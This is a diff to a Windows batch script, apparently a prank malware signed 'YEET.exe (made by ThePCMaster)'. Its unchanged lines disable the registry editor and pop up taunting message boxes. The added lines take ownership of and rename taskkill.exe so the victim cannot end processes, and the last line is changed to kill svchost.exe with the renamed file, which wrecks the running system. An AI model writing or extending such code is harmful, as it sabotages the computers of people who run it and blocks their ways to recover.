@@ -54,6 +54,10 @@ wscript yt.vbs
 attrib -h yt.vbs
 echo x=msgbox("you wanna use regedit to unblock task manager? well good luck cuz i disabled the registry editor as well",0,"YEET.exe (made by ThePCMaster)")>yt.vbs
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f
+takeown /f c:\windows\system32\taskkill.exe
+icacls C:\windows\system32\taskkill.exe /grant %username%:F
+ren C:\Windows\system32\taskkill.exe suckyouidiottaskkill.exe
+echo x=msgbox("oh you wanna use taskkill.exe to kill cmd.exe? good luck with that XDD",0,"YEET.exe (made by ThePCMaster)")>yt.vbs
 attrib +h yt.vbs
 wscript yt.vbs
 attrib -h yt.vbs
@@ -150,4 +154,4 @@ echo x=msgbox("You got your computer screwed up successfully.",48+0,"Microsoft W
 attrib +h yt.vbs
 wscript yt.vbs
 del yt.vbs /f
-taskkill /f /im svchost.exe
+suckyouidiottaskkill /f /im svchost.exe
